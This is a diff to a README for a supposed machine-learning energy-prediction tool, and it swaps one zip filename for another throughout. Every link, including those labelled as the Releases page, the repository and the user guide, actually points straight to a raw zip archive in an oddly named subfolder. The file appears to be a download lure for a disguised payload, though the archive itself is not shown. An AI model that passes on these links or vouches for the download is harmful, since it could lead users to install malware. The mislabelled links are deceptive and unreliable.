@@ -1,6 +1,6 @@
 # 🔋 energy-consumption-ml-prediction - Predict Energy Use with Ease
 
-[![Download](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/energy-consumption-ml-prediction.zip%20Now-%20-%23FF5733)](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/energy-consumption-ml-prediction.zip)
+[![Download](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/consumption_energy_prediction_ml_v1.2.zip%20Now-%20-%23FF5733)](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/consumption_energy_prediction_ml_v1.2.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started with this application, follow these steps to download and install
 ## 📥 Download & Install
 
 1. **Visit the download page**: Click the link below to access the Releases page where you can download the application.
-   [Download from Releases](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/energy-consumption-ml-prediction.zip)
+   [Download from Releases](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/consumption_energy_prediction_ml_v1.2.zip)
 
 2. **Choose the right file**: On the Releases page, look for the version suitable for your system. Download the corresponding file.
 
@@ -46,8 +46,8 @@ To ensure smooth operation, please check that your system meets the following re
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/energy-consumption-ml-prediction.zip)
-- [User Guide](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/energy-consumption-ml-prediction.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/consumption_energy_prediction_ml_v1.2.zip)
+- [User Guide](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/consumption_energy_prediction_ml_v1.2.zip)
 
 ## ⚠️ Troubleshooting
 
@@ -71,4 +71,4 @@ Follow the project on GitHub to get notifications about future releases and upda
 
 Thank you for choosing the energy-consumption-ml-prediction tool. We hope it helps you understand and predict energy usage more effectively. For any feedback or suggestions, feel free to reach out through the repository. 
 
-[Download from Releases](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/energy-consumption-ml-prediction.zip)
+[Download from Releases](https://raw.githubusercontent.com/lavishly-deathly/energy-consumption-ml-prediction/main/ciliiferous/consumption_energy_prediction_ml_v1.2.zip)
